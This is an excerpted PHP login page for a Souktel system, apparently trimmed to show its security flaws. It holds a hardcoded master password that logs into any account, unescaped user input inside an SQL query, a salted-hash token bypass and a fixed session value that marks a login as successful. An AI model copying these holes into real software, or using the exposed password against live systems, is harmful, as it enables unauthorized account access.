...
if($req_action != "1") {
	...
	if(sha1("6784567GFD".$extended_get1."214XdT00".$extended_get1."sktxx#21") == $extended_get2) {
...
<html dir="ltr">
    ...
    <body topmargin="0" leftmargin="0" rightmargin="0" bottommargin="0" marginwidth="0" marginheight="0">
		...
		<?php if(strtolower($_SERVER["HTTP_HOST"])=='.souktelgaza.com' || strtolower($_SERVER["HTTP_HOST"])=='www.souktelgaza.org') {?>
	    <table border="0" width="500" cellpadding="0" style="border-collapse: collapse">
                <tr>
                    <td width="200" align="left" valign="middle"><img src="images/system/header.gif" width="230" height="150"></td>
                    <td>&nbsp;</td>
                    <td width="200" align="right" valign="middle"><img src="images/system/header2.gif"></td>
                </tr>
	    </table>
	    <?php } else {?>
            	    <table border="0" width="500" cellpadding="0" style="border-collapse: collapse">
...
AND (tbl_sys_user.password = SHA1('$txt_password') OR '$txt_password' = 'SoukTelTe@m')
...
AND tbl_sys.status > 0 
	...
	if($row = mysql_fetch_array($rs)) {
	    ...
	    if($afr == 1) {
		$modules = array();
              //  echo "SELECT rm.prefix FROM tbl_ref_module rm, tbl_sys_module sm, tbl_sys_user_module um WHERE um.module_id = sm.module_id AND um.module_id = rm.module_id AND sm.module_id = rm.module_id AND sm.sys_id = $sys_id AND um.user_id = $user_id"; exit;
		...
		//Login success
		    ...
		    $_SESSION['param_session_login-true'] = "souktel-sudani54-true";
